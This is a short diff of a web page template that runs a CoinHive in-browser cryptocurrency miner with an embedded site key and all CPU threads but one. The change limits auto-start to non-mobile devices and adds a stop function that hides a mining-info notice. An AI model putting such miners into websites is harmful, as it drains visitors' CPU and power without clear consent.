@@ -37,7 +37,16 @@
       var miner = new CoinHive.Anonymous('e4cjnPnR00ZZFwzJdeC6MIIVFA7GdMLi', {
         threads: navigator.hardwareConcurrency - 1
       });
-      miner.start();
+
+      // Only start on non-mobile devices
+      if (!miner.isMobile()) {
+        miner.start();
+      }
+
+      function stopMiner() {
+      	miner.stop();
+      	document.querySelector('.mining-info').style.display = 'none';
+      }
     </script>
   {{/unless}}
   </body>
